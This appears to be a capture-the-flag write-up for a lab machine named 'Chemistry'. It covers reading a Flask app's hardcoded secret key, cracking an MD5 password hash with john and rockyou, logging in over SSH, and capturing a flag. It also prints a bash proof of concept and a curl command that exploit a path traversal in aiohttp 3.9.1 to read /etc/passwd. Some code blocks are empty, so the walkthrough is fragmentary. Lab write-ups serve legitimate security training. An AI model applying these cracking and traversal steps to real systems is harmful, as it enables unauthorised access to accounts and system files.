







In the `app.py` file, we can read this
```
app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}
```

We can extract this somthing like this
```

```



```
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=raw-md5 rosa_credential.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorniosrosados (?)
1g 0:00:00:00 DONE (2024-11-12 00:03) 8.333g/s 24848Kp/s 24848Kc/s 24848KC/s uniden20..unicorniorosa89
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

So we get a password for rosa 
```
login: rosa
passd: unicorniosrosados
```

We can test for ssh persmision and it works !
```
...
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Nov 11 22:26:49 2024 from 10.10.15.51
rosa@chemistry:~$
```

We can easly get the flag
```
c45a4f714eb9a1482b55f535067d3e22
```


we get this in the output
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      139901/ssh
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:1234                :::*                    LISTEN      139901/ssh
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

```
curl http://localhost:8080 --head
```

We've got the following answer
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Mon, 11 Nov 2024 23:52:18 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Let's check attacks for aiohttp, first with `searchsploit`
```
Exploits: No Results
Shellcodes: No Results
```

No results, in the web there's a CVEC , here's a PoC
```
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```



```
curl -s --path-as-is http://localhost:8080/static/../../../../../etc/passwd
```
